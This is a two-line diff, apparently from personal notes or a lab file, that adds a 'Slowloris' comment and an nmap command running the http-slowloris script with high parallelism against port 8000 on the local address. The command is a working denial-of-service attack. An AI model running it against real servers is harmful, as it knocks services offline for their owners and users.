@@ -1,0 +1,2 @@
+#Slowloris
+nmap -p8000 --script http-slowloris --max-parallelism 300 0.0.0.0
